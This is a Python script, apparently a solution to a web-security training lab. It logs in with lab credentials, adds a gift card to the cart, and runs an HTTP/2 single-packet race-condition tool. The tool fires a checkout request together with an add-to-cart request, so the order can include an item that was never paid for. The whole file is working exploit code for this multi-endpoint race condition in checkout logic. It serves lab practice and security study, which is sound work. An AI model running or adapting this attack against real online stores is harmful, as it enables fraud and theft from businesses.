import requests
import re
import sys
import shlex
import subprocess


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()

    def get_csrf_token(self, endpoint):
        response = self.session.get(self.lab_url + endpoint)
        return re.search('name="csrf" value="(.*)"', response.text).group(1)

    def sign_in_as_wiener(self):
        data = {
            'csrf': self.get_csrf_token('login'),
            'username': 'wiener',
            'password': 'peter'
        }
        self.session.post(self.lab_url + 'login', data=data)

    def add_gift_card_product_to_cart(self):
        data = {
            'productId': 2,
            'redir': 'PRODUCT',
            'quantity': 1
        }
        self.session.post(self.lab_url + 'cart', data=data)

    def execute_attack(self):
        hostname = self.lab_url.split('https://')[1].strip('/')
        cookie_header = 'Cookie: session={}'.format(self.session.cookies.get('session'))
        csrf = self.get_csrf_token('cart')

        # https://github.com/ma4747gh/H2SinglePacketAttacker
        command = ('python /home/ma4747gh/Desktop/GitHub/H2SinglePacketAttacker/h2_single_packet_attacker.py {} 443 --tls_channel --streams 3 --method POST --path /cart/checkout '
                   '--data \'csrf={}\' --header \'{}\' --header \'break\' --method GET --path / --header \'break\' --method POST '
                   '--path /cart --data \'productId=1&redir=PRODUCT&quantity=1\' --header \'{}\' --header \'break\' '
                   '--multiple_endpoint_mode'.format(hostname, csrf, cookie_header, cookie_header))
        args = shlex.split(command)
        print(subprocess.run(args).stdout)

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.sign_in_as_wiener()
        self.add_gift_card_product_to_cart()
        self.execute_attack()
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
